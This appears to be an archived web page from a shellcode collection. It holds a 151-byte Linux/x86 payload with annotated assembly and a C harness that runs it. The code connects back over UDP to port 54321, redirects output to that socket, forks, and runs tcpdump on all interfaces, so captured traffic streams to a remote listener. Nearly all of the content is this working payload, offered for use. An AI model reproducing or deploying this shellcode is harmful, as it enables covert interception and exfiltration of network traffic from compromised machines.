<html><head><title>Linux/x86 - Connect-Back port UDP/54321 - 151 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 linux/x86 connect-back port UDP/54321 &amp; dup2 &amp;
 fork() &amp; execve() /usr/bin/tcpdump -iany -w- &quot;port ! 54321&quot;
 151 bytes
 by XenoMuta
     _  __                 __  ___      __       
    | |/ /__  ____  ____  /  |/  /_  __/ /_____ _
    |   / _ \/ __ \/ __ \/ /|_/ / / / / __/ __ `/
   /   /  __/ / / / /_/ / /  / / /_/ / /_/ /_/ / 
  /_/|_\___/_/ /_/\____/_/  /_/\__,_/\__/\__,_/  

   xenomuta [ arroba ] phreaker [ punto ] net

  http://xenomuta.tuxfamily.org/ - Methylxantina 256mg
  
 - God bless you all -

*/
unsigned char sc[] =
// &lt;_start&gt;:
&quot;\x6a\x66&quot;	 // push   $0x66 ; socketcall()
&quot;\x58&quot;		 // pop    %eax  ; para setear el socket 
&quot;\x6a\x01&quot;	 // push   $0x1  
&quot;\x5b&quot;		 // pop    %ebx
&quot;\x31\xc9&quot;	 // xor    %ecx,%ecx
&quot;\x51&quot;		 // push   %ecx
&quot;\x6a\x02&quot;	 // push   $0x2  ; SOCK_DGRAM (udp)
&quot;\x6a\x02&quot;	 // push   $0x2   
&quot;\x89\xe1&quot;	 // mov    %esp,%ecx
&quot;\xcd\x80&quot;	 // int    $0x80
// IP: 127.1.1.1
&quot;\x68\x7f\x01\x01\x01&quot;	 // push   $0x101017f
// Port: 54321
&quot;\x66\x68\xd4\x31&quot;	 // pushw  $0x31d4
&quot;\x66\x31\xc9&quot;	 // xor    %cx,%cx
&quot;\x80\xc1\x02&quot;	 // xadd    $0x2,%cl
&quot;\x66\x51&quot;	 // push   %cx
&quot;\x89\xe1&quot;	 // mov    %esp,%ecx
&quot;\x6a\x10&quot;	 // push   $0x10
&quot;\x51&quot;		 // push   %ecx
&quot;\x50&quot;		 // push   %eax
&quot;\x89\xe1&quot;	 // mov    %esp,%ecx
&quot;\x89\xc6&quot;	 // mov    %eax,%esi
&quot;\xb0\x66&quot;	 // mov    $0x66,%al  ; socketcall ()
&quot;\x80\xc3\x02&quot;	 // add    $0x2,%bl   ; para connect()
&quot;\xcd\x80&quot;	 // int    $0x80
&quot;\x87\xde&quot;	 // xchg   %ebx,%esi  
&quot;\x6a\x01&quot;	 // push   $0x1
&quot;\x59&quot;		 // pop    %ecx
&quot;\x6a\x3f&quot;	 // push   $0x3f      ; dup2(socket, stdout)
&quot;\x58&quot;		 // pop    %eax
&quot;\xcd\x80&quot;	 // int    $0x80
&quot;\x31\xd2&quot;	 // xor    %edx,%edx  
&quot;\x6a\x02&quot;	 // push   $0x2       ; fork()
&quot;\x58&quot;		 // pop    %eax
&quot;\xcd\x80&quot;	 // int    $0x80
&quot;\x39\xd0&quot;	 // cmp    %edx,%eax  ; el hijo sobrevive
&quot;\x74\x05&quot;	 // je     0x4d &lt;_child&gt;
&quot;\x6a\x01&quot;	 // push   $0x1       ; adios papa
&quot;\x58&quot;		 // pop    %eax
&quot;\xcd\x80&quot;	 // int    $0x80
//&lt;_child&gt;:
&quot;\x6a\x0b&quot;	 // push   $0xb    ; execve() tcpdump -iany -w- &quot;port ! 54321&quot;
&quot;\x58&quot;		 // pop    %eax    ; sniffea todo menos a mi mismo.
&quot;\x52&quot;		 // push   %edx
&quot;\x68\x34\x33\x32\x31&quot;	 // push   $0x31323334 ; &quot;port ! 54321&quot;
&quot;\x68\x20\x21\x20\x35&quot;	 // push   $0x35202120
&quot;\x68\x70\x6f\x72\x74&quot;	 // push   $0x74726f70
&quot;\x89\xe7&quot;	 // mov    %esp,%edi
&quot;\x52&quot;		 // push   %edx
&quot;\x6a\x2d&quot;	 // push   $0x2d               ; -w- ( escribe a stdout )
&quot;\x66\x68\x2d\x77&quot;	 // pushw  $0x772d
&quot;\x89\xe6&quot;	 // mov    %esp,%esi
&quot;\x52&quot;		 // push   %edx
&quot;\x6a\x79&quot;	 // push   $0x79               ; -iany (todas las interfaces )
&quot;\x68\x2d\x69\x61\x6e&quot;	 // push   $0x6e61692d
&quot;\x89\xe1&quot;	 // mov    %esp,%ecx
&quot;\x52&quot;		 // push   %edx
&quot;\x6a\x70&quot;	 // push   $0x70
&quot;\x68\x70\x64\x75\x6d&quot;	 // push   $0x6d756470 ; /usr/bin/tcpdump
&quot;\x68\x6e\x2f\x74\x63&quot;	 // push   $0x63742f6e
&quot;\x68\x2f\x73\x62\x69&quot;	 // push   $0x6962732f
&quot;\x68\x2f\x75\x73\x72&quot;	 // push   $0x7273752f
&quot;\x89\xe3&quot;	 // mov    %esp,%ebx
&quot;\x52&quot;		 // push   %edx
&quot;\x57&quot;		 // push   %edi
&quot;\x56&quot;		 // push   %esi
&quot;\x51&quot;		 // push   %ecx
&quot;\x53&quot;		 // push   %ebx
&quot;\x89\xe1&quot;	 // mov    %esp,%ecx
&quot;\xcd\x80&quot;;	 // int    $0x80


main(){(*(void (*)()) sc)();}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
